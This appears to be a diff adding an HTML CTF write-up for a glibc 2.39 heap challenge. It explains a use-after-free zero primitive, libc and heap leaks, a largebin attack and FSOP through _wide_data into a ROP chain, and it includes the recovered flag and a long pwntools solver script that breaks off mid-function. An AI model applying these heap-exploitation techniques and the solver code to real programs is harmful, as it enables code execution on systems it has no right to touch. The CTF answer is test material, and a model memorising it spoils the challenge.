+    <span class="tag">phase / analysis</span>
+  </div>
+  <div class="panel prose">
+    <p>The zero operation lets me clear specific bytes in a chunk that the program still holds a pointer to, even after that chunk has entered allocator bookkeeping paths. The bug is a mismatch between the program's object lifecycle and glibc's chunk lifecycle.</p>
+    <p>When a chunk larger than the fastbin/tcache threshold is freed, glibc eventually sorts it into the large bin. The large bin maintains two orderings: a size-ordered list and an insertion-order list. Each node carries four pointers: <code>fd</code>, <code>bk</code>, <code>fd_nextsize</code>, <code>bk_nextsize</code>. If I can corrupt <code>fd_nextsize</code> or <code>bk_nextsize</code> on a live large-bin node, the allocator will write attacker-chosen values into attacker-chosen addresses the next time it sorts or unlinks that chunk.</p>
+    <p>The zero primitive is how I reach those pointers. I free a large chunk, it enters the large bin, and its metadata pointers sit right in the user-data region I can still address. I zero selected bytes of those pointers to redirect the write primitive wherever I want.</p>
+    <div class="callout warn">
+      <b>// key insight</b><br>
+      Large-bin <code>fd_nextsize</code> corruption + forced re-sort = arbitrary write. The zero primitive is precise enough to surgically clear the bytes needed without destroying the surrounding metadata.
+    </div>
+  </div>
+</section>
+
+<section id="exploit-chain">
+  <div class="sec-head">
+    <span class="idx">03 //</span>
+    <h2>exploit chain</h2>
+    <span class="tag">phase / exploitation</span>
+  </div>
+  <div class="panel prose">
+    <h3>Step 1 -- libc leak</h3>
+    <p>I allocate a chunk large enough to land in the large bin (size <code>0x510</code>). After freeing it and triggering a sort, the chunk's <code>fd</code> and <code>bk</code> fields point into <code>main_arena</code> inside libc. The view operation reads those bytes through the stale allocation pointer. I pull six bytes and compute:</p>
+    <pre><code>libc_base = leaked_arena_ptr - main_arena_offset_from_libc_base</code></pre>
+    <p>The solver resolves <code>main_arena</code> dynamically from the Ubuntu Noble libc6-dbg package rather than hardcoding an offset. That keeps it working when the server patches.</p>
+
+    <h3>Step 2 -- heap leak</h3>
+    <p>The same freed chunk also holds heap-relative pointers in its <code>fd_nextsize</code>/<code>bk_nextsize</code> fields after a safe-linking operation. I decode the mangled pointer and recover the heap base. The fake FILE structure and ROP chain I place later need to land at deterministic heap addresses, so this leak is not optional.</p>
+
+    <h3>Step 3 -- largebin attack</h3>
+    <p>With both bases known, I set up the heap so a second large chunk lands in the bin just after my target. I use the zero primitive to null out the lower bytes of <code>fd_nextsize</code> on the first bin node, redirecting the nextsize link to an address I control. When I allocate again and the allocator unlinks the corrupted node, it writes a victim-chunk address into my chosen target. This gives me an overlapping allocation: two live program pointers refer to the same heap region.</p>
+
+    <h3>Step 4 -- FSOP endgame</h3>
+    <p>Modern glibc (2.29+) checks that FILE vtable pointers fall within a read-only region of libc. Direct vtable forgery is blocked. Instead I use the wide-data side-channel: I point the forged FILE's <code>_wide_data</code> at attacker-controlled memory, set <code>_wide_data->_IO_write_base</code> to zero and <code>_wide_data->_IO_buf_base</code> to a gadget that pivots into <code>setcontext+61</code>, and plant the vtable pointer at <code>_IO_wfile_jumps</code> (a legitimate libc vtable). When libc flushes FILE structures at exit, the wide-data path fires and hands control to my ROP chain.</p>
+    <pre><code>forged FILE
+  -> _IO_wfile_jumps   (legitimate libc vtable, passes vtable check)
+  -> _wide_data        (heap-resident, attacker-controlled)
+  -> setcontext+61     (pivots RSP into ROP stack)
+  -> ROP: open("/flag") -> read(fd, buf) -> write(1, buf, 0x100)</code></pre>
+  </div>
+</section>
+
+<section id="sim">
+  <div class="sec-head">
+    <span class="idx">04 //</span>
+    <h2>live solver -- terminal simulator</h2>
+    <span class="tag">phase / tool sim</span>
+  </div>
+  <div class="panel prose">
+    <p>This sim walks through each stage of the exploit as I ran it: leak, heap recovery, largebin attack, FILE forge, and flag. Hit RUN to watch it play out, or STEP to advance manually.</p>
+  </div>
+  <div class="sim" role="application" aria-label="nullshui solver simulator">
+    <div class="head">
+      <span class="dots"><span></span><span></span><span></span></span>
+      <span class="title">nullshui_solver_deterministic.py</span>
+      <span class="stage">stage: <b id="sim-stage">idle</b></span>
+    </div>
+    <div class="body" id="sim-body" aria-live="polite">
+      <span class="line system">[*] nullshui solver ready -- glibc 2.39 heap pwn</span>
+      <span class="line system">[*] target: nullshi-&lt;instance&gt;.inst.omnictf.com:1337 (ssl)</span>
+      <span class="line system">[*] press RUN to execute all stages, or STEP to advance one at a time</span>
+      <span class="cursor">_</span>
+    </div>
+    <div class="controls">
+      <input id="sim-target" type="text" value="nullshi-9a2c49ebb8fc.inst.omnictf.com:1337" placeholder="host:port">
+      <button id="sim-run" type="button">RUN</button>
+      <button id="sim-step" class="ghost" type="button">STEP</button>
+      <button id="sim-reset" class="ghost" type="button">RESET</button>
+      <button id="sim-copy" class="ghost" type="button" disabled>COPY FLAG</button>
+    </div>
+  </div>
+</section>
+
+<section id="signal">
+  <div class="sec-head">
+    <span class="idx">05 //</span>
+    <h2>connection map</h2>
+    <span class="tag">phase / visualization</span>
+  </div>
+  <div class="map-wrap">
+    <svg id="signal-map" viewBox="0 0 1100 340" role="img" aria-label="Connection map of the nullshui solve">
+      <defs>
+        <marker id="arr" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M 0 0 L 10 5 L 0 10 z" /></marker>
+        <marker id="arr-faint" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M 0 0 L 10 5 L 0 10 z" /></marker>
+        <linearGradient id="bg-grad" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#020100"/><stop offset="100%" stop-color="#010a09"/></linearGradient>
+      </defs>
+      <rect class="bg" x="0" y="0" width="1100" height="340" fill="url(#bg-grad)" rx="5"/>
+      <rect class="pack" x="20"  y="30" width="200" height="100" rx="5" ry="5"/>
+      <text class="pack-label" x="26"  y="26">SETUP</text>
+      <rect class="pack" x="250" y="30" width="200" height="170" rx="5" ry="5"/>
+      <text class="pack-label" x="256" y="26">LEAK PHASE</text>
+      <rect class="pack" x="480" y="30" width="200" height="170" rx="5" ry="5"/>
+      <text class="pack-label" x="486" y="26">CORRUPTION</text>
+      <rect class="pack" x="710" y="30" width="200" height="240" rx="5" ry="5"/>
+      <text class="pack-label" x="716" y="26">FSOP CHAIN</text>
+      <rect class="pack" x="940" y="30" width="140" height="100" rx="5" ry="5"/>
+      <text class="pack-label" x="946" y="26">RESULT</text>
+      
+      <path class="edge" d="M 120.0 79.0 C 162 99, 208 99, 250.0 79.0" marker-end="url(#arr)" data-edge="e01-03"/>
+      <path class="edge" d="M 120.0 119.0 C 162 139, 208 139, 250.0 119.0" marker-end="url(#arr)" data-edge="e02-04"/>
+      <path class="edge" d="M 350.0 79.0 C 370 92, 270 106, 250.0 119.0" marker-end="url(#arr)" data-edge="e03-04"/>
+      <path class="edge" d="M 350.0 79.0 C 392 99, 438 99, 480.0 79.0" marker-end="url(#arr)" data-edge="e03-05"/>
+      <path class="edge" d="M 350.0 119.0 C 392 139, 438 139, 480.0 119.0" marker-end="url(#arr)" data-edge="e04-06"/>
+      <path class="edge" d="M 350.0 119.0 C 392 119, 438 189, 480.0 189.0" marker-end="url(#arr)" data-edge="e04-07"/>
+      <path class="edge" d="M 580.0 79.0 C 600 92, 500 106, 480.0 119.0" marker-end="url(#arr)" data-edge="e05-06"/>
+      <path class="edge" d="M 580.0 79.0 C 622 99, 668 99, 710.0 79.0" marker-end="url(#arr)" data-edge="e05-08"/>
+      <path class="edge" d="M 580.0 189.0 C 622 189, 668 119, 710.0 119.0" marker-end="url(#arr)" data-edge="e07-09"/>
+      <path class="edge" d="M 810.0 79.0 C 830 92, 730 106, 710.0 119.0" marker-end="url(#arr)" data-edge="e08-09"/>
+      <path class="edge" d="M 810.0 79.0 C 830 92, 730 176, 710.0 189.0" marker-end="url(#arr)" data-edge="e08-10"/>
+      <path class="edge" d="M 810.0 119.0 C 830 132, 730 176, 710.0 189.0" marker-end="url(#arr)" data-edge="e09-10"/>
+      <path class="edge" d="M 810.0 189.0 C 830 202, 730 246, 710.0 259.0" marker-end="url(#arr)" data-edge="e10-11"/>
+      <path class="edge" d="M 810.0 259.0 C 852 259, 898 99, 940.0 79.0" marker-end="url(#arr)" data-edge="e11-12"/>
+      
+      <g class="node" data-node="n01"><rect x="30" y="55" width="180" height="48" rx="3"/><text class="head" x="40" y="69">NODE 01</text><text class="title" x="40" y="85">ALLOCATE CHUNKS</text><text class="body" x="40" y="99">large bin candidates</text></g>
+      <g class="node" data-node="n02"><rect x="30" y="105" width="180" height="48" rx="3"/><text class="head" x="40" y="119">NODE 02</text><text class="title" x="40" y="135">FREE + SORT</text><text class="body" x="40" y="149">force into largebin</text></g>
+      <g class="node" data-node="n03"><rect x="260" y="55" width="180" height="48" rx="3"/><text class="head" x="270" y="69">NODE 03</text><text class="title" x="270" y="85">LIBC LEAK</text><text class="body" x="270" y="99">main_arena ptr via view</text></g>
+      <g class="node" data-node="n04"><rect x="260" y="105" width="180" height="48" rx="3"/><text class="head" x="270" y="119">NODE 04</text><text class="title" x="270" y="135">HEAP LEAK</text><text class="body" x="270" y="149">decode safe-link ptr</text></g>
+      <g class="node" data-node="n05"><rect x="490" y="55" width="180" height="48" rx="3"/><text class="head" x="500" y="69">NODE 05</text><text class="title" x="500" y="85">ZERO PRIMITIVE</text><text class="body" x="500" y="99">null fd_nextsize bytes</text></g>
+      <g class="node" data-node="n06"><rect x="490" y="105" width="180" height="48" rx="3"/><text class="head" x="500" y="119">NODE 06</text><text class="title" x="500" y="135">LARGEBIN ATTACK</text><text class="body" x="500" y="149">corrupt nextsize ptr</text></g>
+      <g class="node" data-node="n07"><rect x="490" y="175" width="180" height="48" rx="3"/><text class="head" x="500" y="189">NODE 07</text><text class="title" x="500" y="205">OVERLAP ALLOC</text><text class="body" x="500" y="219">two ptrs, one region</text></g>
+      <g class="node" data-node="n08"><rect x="720" y="55" width="180" height="48" rx="3"/><text class="head" x="730" y="69">NODE 08</text><text class="title" x="730" y="85">FORGE FILE</text><text class="body" x="730" y="99">fake _IO_FILE struct</text></g>
+      <g class="node" data-node="n09"><rect x="720" y="105" width="180" height="48" rx="3"/><text class="head" x="730" y="119">NODE 09</text><text class="title" x="730" y="135">WIDE DATA PTR</text><text class="body" x="730" y="149">attacker _wide_data</text></g>
+      <g class="node" data-node="n10"><rect x="720" y="175" width="180" height="48" rx="3"/><text class="head" x="730" y="189">NODE 10</text><text class="title" x="730" y="205">SETCONTEXT</text><text class="body" x="730" y="219">pivot RSP to ROP</text></g>
+      <g class="node" data-node="n11"><rect x="720" y="245" width="180" height="48" rx="3"/><text class="head" x="730" y="259">NODE 11</text><text class="title" x="730" y="275">ROP CHAIN</text><text class="body" x="730" y="289">open/read/write flag</text></g>
+      <g class="node" data-node="n12"><rect x="950" y="55" width="120" height="68" rx="3"/><text class="head" x="960" y="69">NODE 12</text><text class="title" x="960" y="85">FLAG</text><text class="body" x="960" y="101" font-size="9">OmniCTF{145963c105e9ed8dbf6d95c06fb552fe63062dcdd885bd4c208a4693b8af8a30}</text></g>
+    </svg>
+  </div>
+</section>
+
+<section id="flag">
+  <div class="sec-head">
+    <span class="idx">06 //</span>
+    <h2>recovered flag</h2>
+    <span class="tag">phase / verify</span>
+  </div>
+  <div class="result">
+    <div class="label">// flag // omnictf 2026 // nullshui</div>
+    <div class="flag-text" id="flag-text">OmniCTF{145963c105e9ed8dbf6d95c06fb552fe63062dcdd885bd4c208a4693b8af8a30}</div>
+  </div>
+</section>
+
+
+<section id="solver">
+  <div class="sec-head">
+    <span class="idx">07 //</span>
+    <h2>solver script</h2>
+    <span class="tag">appendix / exploit</span>
+  </div>
+  <div class="panel code-block" style="max-height: 500px; overflow-y: auto; font-family: 'JetBrains Mono', monospace; font-size: 11px;">
+    <pre><code class="language-python">#!/usr/bin/env python3
+&quot;&quot;&quot;
+OmniCTF nullshui solver.
+
+Accepted endpoint forms:
+    python3 nullshui_solver.py ncat --ssl HOST PORT
+    python3 nullshui_solver.py HOST PORT
+    python3 nullshui_solver.py --local --binary ./main ...
+
+This deterministic version derives the live stack target from __libc_argv and the exact libc startup machine code.
+
+The default libc profile matches the handout&#x27;s pinned Ubuntu image
+(ubuntu:noble-20260509.1): libc6 2.39-0ubuntu8.7.  On first use the script
+caches the official libc6 and libc6-dbg packages so it can resolve
+main_arena, exported symbols, and ROP gadgets without hard-coded gadget
+addresses.
+&quot;&quot;&quot;
+
+from __future__ import annotations
+
+import argparse
+import hashlib
+import io as pyio
+import os
+from pathlib import Path
+import re
+import shutil
+import struct
+import sys
+import tarfile
+import tempfile
+import urllib.request
+
+try:
+    from pwn import ELF, ROP, context, log, p64, process, remote
+except ImportError as exc:
+    raise SystemExit(
+        &quot;pwntools is required: python3 -m pip install --user pwntools&quot;
+    ) from exc
+
+context.clear(arch=&quot;amd64&quot;, os=&quot;linux&quot;)
+
+DEFAULT_GLIBC_VERSION = &quot;2.39-0ubuntu8.7&quot;
+DEFAULT_PACKAGE_ROOT = &quot;https://security.ubuntu.com/ubuntu/pool/main/g/glibc&quot;
+DEFAULT_LIBC_SHA256 = &quot;955644e8bc2930a9bf8eea5e4c2237c8a118c1e2ac2845b993b6f7f35eefd293&quot;
+
+# malloc_state geometry for amd64 glibc 2.39:
+# largebin_index_64(0x510) == 68
+# bin_at(main_arena, 68) == main_arena + 0x490
+LARGEBIN_0X510_HEAD_FROM_MAIN_ARENA = 0x490
+
+MREQ = 0x928
+P_HEADER_FROM_L_USER = 0x410
+FAKE_TCACHE_SIZE = 0x411  # request 0x400 -&gt; chunk size 0x410
+FLAG_RE = re.compile(rb&quot;(?:omniCTF|OMNICTF)\{[^}\r\n]+\}&quot;)
+
+
+def parse_int(value: str) -&gt; int:
+    return int(value, 0)
+
+
+def qword(data: bytes) -&gt; int:
+    return int.from_bytes(data[:8].ljust(8, b&quot;\0&quot;), &quot;little&quot;)
+
+
+def extract_six_byte_leak(output: bytes, marker: bytes, label: str) -&gt; int:
+    position = output.find(marker)
+    if position &lt; 0:
+        raise RuntimeError(f&quot;{label}: marker was not returned by view&quot;)
+    raw = output[position + len(marker) : position + len(marker) + 6]
+    if len(raw) != 6:
+        raise RuntimeError(f&quot;{label}: received only {len(raw)} leak bytes&quot;)
+    return qword(raw)
+
+
+def download(url: str, destination: Path, expected_sha256: str | None = None) -&gt; None:
+    destination.parent.mkdir(parents=True, exist_ok=True)
+    temporary = destination.with_suffix(destination.suffix + &quot;.part&quot;)
+    log.info(f&quot;downloading {destination.name}&quot;)
+    request = urllib.request.Request(url, headers={&quot;User-Agent&quot;: &quot;nullshui-solver/1.0&quot;})
+    try:
+        with urllib.request.urlopen(request, timeout=60) as response, temporary.open(&quot;wb&quot;) as out:
+            digest = hashlib.sha256()
+            while True:
+                block = response.read(1024 * 1024)
+                if not block:
+                    break
+                out.write(block)
+                digest.update(block)
+    except Exception:
+        temporary.unlink(missing_ok=True)
+        raise
+
+    actual = digest.hexdigest()
+    if expected_sha256 and actual.lower() != expected_sha256.lower():
+        temporary.unlink(missing_ok=True)
+        raise RuntimeError(
+            f&quot;checksum mismatch for {destination.name}: {actual} != {expected_sha256}&quot;
+        )
+    temporary.replace(destination)
+
+
+def read_ar_members(path: Path) -&gt; dict[str, bytes]:
+    data = path.read_bytes()
+    if not data.startswith(b&quot;!&lt;arch&gt;\n&quot;):
+        raise RuntimeError(f&quot;{path} is not a Debian/ar archive&quot;)
+    members: dict[str, bytes] = {}
+    offset = 8
+    while offset + 60 &lt;= len(data):
+        header = data[offset : offset + 60]
+        offset += 60
+        if header[58:60] != b&quot;`\n&quot;:
+            raise RuntimeError(f&quot;malformed ar header in {path}&quot;)
+        name = header[:16].decode(&quot;ascii&quot;, &quot;replace&quot;).strip().rstrip(&quot;/&quot;)
+        size = int(header[48:58].decode(&quot;ascii&quot;).strip())
+        body = data[offset : offset + size]
+        members[name] = body
+        offset += size + (size &amp; 1)
+    return members
+
+
+def safe_extract_tar(archive: tarfile.TarFile, destination: Path) -&gt; None:
+    root = destination.resolve()
+    for member in archive:
+        target = (destination / member.name).resolve()
+        if target != root and root not in target.parents:
+            raise RuntimeError(f&quot;unsafe path in package: {member.name}&quot;)
+        archive.extract(member, destination)
+
+
+def extract_deb(path: Path, destination: Path) -&gt; None:
+    marker = destination / &quot;.extracted&quot;
+    if marker.exists():
+        return
+    if destination.exists():
+        shutil.rmtree(destination)
+    destination.mkdir(parents=True)
+
+    members = read_ar_members(path)
+    item = next(((name, body) for name, body in members.items() if name.startswith(&quot;data.tar&quot;)), None)
+    if item is None:
+        raise RuntimeError(f&quot;no data.tar member in {path}&quot;)
+    name, body = item
+
+    if name.endswith(&quot;.zst&quot;):
+        try:
+            import zstandard
+        except ImportError as exc:
+            raise RuntimeError(
+                &quot;zstandard is required to unpack Ubuntu .deb files: &quot;
+                &quot;python3 -m pip install --user zstandard&quot;
+            ) from exc
+        reader = zstandard.ZstdDecompressor().stream_reader(pyio.BytesIO(body))
+        decompressed_body = reader.read()
+        with tarfile.open(fileobj=pyio.BytesIO(decompressed_body), mode=&quot;r:*&quot;) as archive:
+            safe_extract_tar(archive, destination)
+    else:
+        with tarfile.open(fileobj=pyio.BytesIO(body), mode=&quot;r:*&quot;) as archive:
+            safe_extract_tar(archive, destination)
+    marker.touch()
+
+
+def find_one(root: Path, name: str) -&gt; Path:
+    matches = [p for p in root.rglob(name) if p.is_file()]
+    if not matches:
+        raise RuntimeError(f&quot;could not find {name} under {root}&quot;)
+    # Prefer the native amd64 library rather than any compatibility copy.
+    matches.sort(key=lambda p: (&quot;x86_64-linux-gnu&quot; not in str(p), len(str(p))))
+    return matches[0]
+
+
+def resolve_default_libc(version: str, package_root: str) -&gt; tuple[Path, Path]:
+    cache = Path(os.environ.get(&quot;XDG_CACHE_HOME&quot;, Path.home() / &quot;.cache&quot;)) / &quot;nullshui&quot; / version
+    libc_deb = cache / f&quot;libc6_{version}_amd64.deb&quot;
+    debug_deb = cache / f&quot;libc6-dbg_{version}_amd64.deb&quot;
+    libc_root = cache / &quot;libc-root&quot;
+    debug_root = cache / &quot;debug-root&quot;
+
+    if not libc_deb.exists():
+        checksum = DEFAULT_LIBC_SHA256 if version == DEFAULT_GLIBC_VERSION else None
+        download(f&quot;{package_root}/{libc_deb.name}&quot;, libc_deb, checksum)
+    if not debug_deb.exists():
+        download(f&quot;{package_root}/{debug_deb.name}&quot;, debug_deb)
+
+    extract_deb(libc_deb, libc_root)
+    extract_deb(debug_deb, debug_root)
+    libc_path = find_one(libc_root, &quot;libc.so.6&quot;)
+
+    libc = ELF(str(libc_path), checksec=False)
+    if not libc.buildid:
+        raise RuntimeError(&quot;downloaded libc has no GNU build ID&quot;)
+    build_id = libc.buildid.hex()
+    debug_path = debug_root / &quot;usr&quot; / &quot;lib&quot; / &quot;debug&quot; / &quot;.build-id&quot; / build_id[:2] / f&quot;{build_id[2:]}.debug&quot;
+    if not debug_path.is_file():
+        # Package layouts occasionally include an extra leading /lib or /usr/lib.
+        candidates = list(debug_root.rglob(f&quot;{build_id[2:]}.debug&quot;))
+        if not candidates:
+            raise RuntimeError(f&quot;matching libc debug image was not found for build ID {build_id}&quot;)
+        debug_path = candidates[0]
+    return libc_path, debug_path
+
+
+def resolve_main_arena(libc: ELF, debug_path: Path | None, override: int | None) -&gt; int:
+    if override is not None:
+        return override
+    direct = libc.symbols.get(&quot;main_arena&quot;)
+    if direct is not None:
+        return direct
+    if debug_path is None:
+        raise RuntimeError(
+            &quot;main_arena is stripped; supply --libc-debug or --main-arena-offset&quot;
+        )
+    debug = ELF(str(debug_path), checksec=False)
+    arena = debug.symbols.get(&quot;main_arena&quot;)
+    if arena is None:
+        raise RuntimeError(f&quot;main_arena is absent from {debug_path}&quot;)
+    return arena
+
+
+def resolve_hidden_symbol(debug_path: Path, exact_name: str) -&gt; int:
+    &quot;&quot;&quot;Resolve a hidden/local libc symbol from the detached debug ELF.&quot;&quot;&quot;
+    debug = ELF(str(debug_path), checksec=False)
+    direct = debug.symbols.get(exact_name)
+    if direct is not None:
+        return direct
+
+    matches = [
+        (name, value)
+        for name, value in debug.symbols.items()
+        if name.startswith(exact_name + &quot;.&quot;)
+    ]
+    if matches:
+        matches.sort(key=lambda item: (len(item[0]), item[0]))
+        return matches[0][1]
+    raise RuntimeError(f&quot;{exact_name} is absent from the matching libc debug image&quot;)
+
+
+def _disassemble(libc: ELF, start: int, size: int = 0x300):
+    try:
+        from capstone import Cs, CS_ARCH_X86, CS_MODE_64
+    except ImportError as exc:
+        raise RuntimeError(&quot;capstone is required for deterministic startup-frame analysis&quot;) from exc
+    decoder = Cs(CS_ARCH_X86, CS_MODE_64)
+    decoder.detail = True
+    return list(decoder.disasm(libc.read(start, size), start))
+
+
+def _rsp_frame_adjustment(instruction) -&gt; int:
+    &quot;&quot;&quot;Return positive bytes reserved on the stack by one instruction.&quot;&quot;&quot;
+    if instruction.mnemonic == &quot;push&quot;:
+        return 8
+    if instruction.mnemonic == &quot;pop&quot;:
+        return -8
+    if instruction.mnemonic in {&quot;sub&quot;, &quot;add&quot;} and instruction.op_str.startswith(&quot;rsp, &quot;):
+        try:
+            amount = int(instruction.op_str.split(&quot;,&quot;, 1)[1].strip(), 0)
+        except ValueError:
+            return 0
+        return amount if instruction.mnemonic == &quot;sub&quot; else -amount
+    return 0
+
+
+def _entry_frame_size(libc: ELF, function: int) -&gt; int:
+    depth = 0
+    for instruction in _disassemble(libc, function):
+        if instruction.mnemonic == &quot;call&quot;:
+            break
+        depth += _rsp_frame_adjustment(instruction)
+    if depth &lt;= 0 or depth &amp; 7:
+        raise RuntimeError(f&quot;invalid startup prologue frame size {depth:#x}&quot;)
+    return depth
+
+
+def _call_main_frame_size(libc: ELF, helper: int) -&gt; int:
+    try:
+        from capstone.x86 import X86_OP_IMM
+    except ImportError as exc:
+        raise RuntimeError(&quot;capstone x86 support is unavailable&quot;) from exc
+
+    depth = 0
+    for instruction in _disassemble(libc, helper, 0x240):
+        if instruction.mnemonic == &quot;call&quot;:
+            if instruction.operands and instruction.operands[0].type != X86_OP_IMM:
+                if depth &lt; 0x80 or depth &amp; 7:
+                    raise RuntimeError(
+                        f&quot;unexpected __libc_start_call_main frame size {depth:#x}&quot;
+                    )
+                return depth
+        depth += _rsp_frame_adjustment(instruction)
+    raise RuntimeError(&quot;could not locate the indirect main() call in libc startup code&quot;)
+
+
+def resolve_call_main_helper(libc: ELF, debug_path: Path) -&gt; int:
+    &quot;&quot;&quot;Locate __libc_start_call_main by symbol or exact code shape.&quot;&quot;&quot;
+    try:
+        return resolve_hidden_symbol(debug_path, &quot;__libc_start_call_main&quot;)
+    except RuntimeError:
+        pass
+
+    try:
+        from capstone.x86 import X86_OP_IMM
+    except ImportError as exc:
+        raise RuntimeError(&quot;capstone x86 support is unavailable&quot;) from exc
+
+    start_main = libc.symbols.get(&quot;__libc_start_main&quot;)
+    if start_main is None:
+        raise RuntimeError(&quot;__libc_start_main is absent from libc&quot;)
+
+    def executable(address: int) -&gt; bool:
+        for segment in libc.segments:
+            header = segment.header
+            if not (int(header.p_flags) &amp; 1):
+                continue
+            begin = int(header.p_vaddr)
+            end = begin + int(header.p_memsz)
+            if begin &lt;= address &lt; end:
+                return True
+        return False
+
+    candidates = []
+    for instruction in _disassemble(libc, start_main, 0x1C0):
+        if instruction.mnemonic != &quot;call&quot; or not instruction.operands:
+            continue
+        operand = instruction.operands[0]
+        if operand.type != X86_OP_IMM:
+            continue
+        target = int(operand.imm)
+        if not executable(target):
+            continue
+        try:
+            frame = _call_main_frame_size(libc, target)
+        except RuntimeError:
+            continue
+        if 0x80 &lt;= frame &lt;= 0x400:
+            candidates.append((abs(target - start_main), target, frame))
+
+    if not candidates:
+        raise RuntimeError(
+            &quot;could not identify __libc_start_call_main from symbols or machine code&quot;
+        )
+    candidates.sort()
+    _, target, frame = candidates[0]
+    log.info(
+        f&quot;identified stripped __libc_start_call_main at {target:#x} &quot;
+        f&quot;(frame {frame:#x})&quot;
+    )
+    return target
+
+
+def derive_argv_to_alloc_rbp(libc: ELF, debug_path: Path, override: int | None) -&gt; int:
+    &quot;&quot;&quot;Derive argv -&gt; active alloc rbp from the exact libc machine code.&quot;&quot;&quot;
+    if override is not None:
+        if override &lt;= 0 or override &amp; 7:
+            raise RuntimeError(f&quot;invalid --argv-to-alloc-offset: {override:#x}&quot;)
+        return override
+
+    start_main = libc.symbols.get(&quot;__libc_start_main&quot;)
+    if start_main is None:
+        raise RuntimeError(&quot;__libc_start_main is absent from libc&quot;)
+    call_main = resolve_call_main_helper(libc, debug_path)
+
+    start_frame = _entry_frame_size(libc, start_main)
+    helper_frame = _call_main_frame_size(libc, call_main)
+    result = 0x58 + start_frame + helper_frame
+    if result &amp; 0xF != 8:
+        raise RuntimeError(
+            &quot;derived argv-to-alloc-rbp offset has impossible alignment: &quot;
+            f&quot;{result:#x} (start={start_frame:#x}, helper={helper_frame:#x})&quot;
+        )
+    log.info(
+        &quot;derived startup frames: &quot;
+        f&quot;__libc_start_main={start_frame:#x}, &quot;
+        f&quot;__libc_start_call_main={helper_frame:#x}&quot;
+    )
+    return result
+
+
+class Challenge:
+    def __init__(self, tube):
+        self.io = tube
+        self.have_prompt = False
+
+    def choose(self, choice: int) -&gt; None:
+        if not self.have_prompt:
+            self.io.recvuntil(b&quot;&gt; &quot;)
+        self.io.sendline(str(choice).encode())
+        self.have_prompt = False
+
+    def finish(self) -&gt; bytes:
+        output = self.io.recvuntil(b&quot;&gt; &quot;)
+        self.have_prompt = True
+        return output
+
+    def alloc(self, index: int, size: int, data: bytes) -&gt; None:
+        self.choose(1)
+        self.io.sendlineafter(b&quot;idx: &quot;, str(index).encode())
+        self.io.sendlineafter(b&quot;size: &quot;, str(size).encode())
+        self.io.sendafter(b&quot;data: &quot;, data)
+        self.finish()
+
+    def begin_alloc(self, index: int, size: int) -&gt; None:
+        self.choose(1)
+        self.io.sendlineafter(b&quot;idx: &quot;, str(index).encode())
+        self.io.sendlineafter(b&quot;size: &quot;, str(size).encode())
+        self.io.recvuntil(b&quot;data: &quot;)
+
+    def free(self, index: int) -&gt; None:
+        self.choose(2)
+        self.io.sendlineafter(b&quot;idx: &quot;, str(index).encode())
+        self.finish()
+
+    def view(self, index: int) -&gt; bytes:
+        self.choose(3)
+        self.io.sendlineafter(b&quot;idx: &quot;, str(index).encode())
+        return self.finish()
+
+    def zero_offset(self, byte_offset: int) -&gt; None:
+        if byte_offset &lt; 0 or byte_offset % 8:
+            raise ValueError(f&quot;invalid zero offset: {byte_offset:#x}&quot;)
+        self.choose(4)
+        self.io.sendlineafter(b&quot;idx: &quot;, str(byte_offset // 8).encode())
+        self.finish()
+
+
+def make_overlap_payload(p_user: int, flag_path: bytes, target: int | None = None) -&gt; bytes:
+    # Only bytes through the forged chunk metadata are required.  Keeping this
+    # short makes the challenge&#x27;s one-shot read more reliable over TCP/TLS.
+    payload = bytearray(b&quot;Z&quot; * (P_HEADER_FROM_L_USER + 0x20))
+    path = flag_path.rstrip(b&quot;\0&quot;) + b&quot;\0&quot;
+    if len(path) &gt; 0x100:
+        raise ValueError(&quot;flag path is too long&quot;)
+    payload[0x100 : 0x100 + len(path)] = path
+    payload[P_HEADER_FROM_L_USER : P_HEADER_FROM_L_USER + 8] = p64(0)
+    payload[P_HEADER_FROM_L_USER + 8 : P_HEADER_FROM_L_USER + 16] = p64(FAKE_TCACHE_SIZE)
+    encoded = 0 if target is None else target ^ (p_user &gt;&gt; 12)
+    payload[P_HEADER_FROM_L_USER + 16 : P_HEADER_FROM_L_USER + 24] = p64(encoded)
+    payload[P_HEADER_FROM_L_USER + 24 : P_HEADER_FROM_L_USER + 32] = p64(0)
+    return bytes(payload)
+
+
+def find_gadget(rop: ROP, instructions: list[str]) -&gt; int:
+    gadget = rop.find_gadget(instructions)
+    if gadget is None:
+        raise RuntimeError(f&quot;missing libc gadget: {&#x27;; &#x27;.join(instructions)}&quot;)
+    return gadget.address
+
+
+class StackSetter:
+    def __init__(self, address: int, insns, regs, move: int):
+        self.address = address
+        self.insns = list(insns)
+        self.regs = list(regs)
+        self.move = move
+
+
+def _setter_candidates(rop: ROP, register: str, forbidden: set[str] | None = None):
+    &quot;&quot;&quot;Return stack-only gadgets which load *register*.
+
+    Extra pops and ``add rsp, N`` are safe because the chain supplies padding.
+    ``pop rsp`` is rejected because it would pivot away from the chain.
+    &quot;&quot;&quot;
+    forbidden = forbidden or set()
+    candidates = []
+    for gadget in rop.gadgets.values():
+        if not gadget.insns or gadget.insns[-1] != &quot;ret&quot;:
+            continue
+        if f&quot;pop {register}&quot; not in gadget.insns:
+            continue
+
+        touched = {item for item in gadget.regs if isinstance(item, str)}
+        if touched &amp; forbidden or &quot;rsp&quot; in touched:
+            continue
+
+        allowed = True
+        for instruction in gadget.insns[:-1]:
+            if instruction.startswith(&quot;pop &quot;):
+                if instruction == &quot;pop rsp&quot;:
+                    allowed = False
+                    break
+                continue
+            if instruction.startswith(&quot;add rsp, &quot;):
+                continue
+            if instruction in {&quot;nop&quot;, &quot;endbr64&quot;}:
+                continue
+            allowed = False
+            break
+        if allowed:
+            candidates.append(gadget)
+
+    candidates.sort(key=lambda gadget: (gadget.move, len(gadget.insns), gadget.address))
+    return candidates
+
+
+def _raw_stack_setters(libc: ELF, register: str, forbidden: set[str] | None = None):
+    &quot;&quot;&quot;Find longer pop/add-rsp/ret gadgets missed by pwntools&#x27; gadget cache.&quot;&quot;&quot;
+    forbidden = forbidden or set()
+    try:
+        from capstone import Cs, CS_ARCH_X86, CS_MODE_64
+    except ImportError:
+        return []
+
+    opcode = {&quot;rdi&quot;: b&quot;\x5f&quot;, &quot;rsi&quot;: b&quot;\x5e&quot;, &quot;rdx&quot;: b&quot;\x5a&quot;}.get(register)
+    if opcode is None:
+        return []
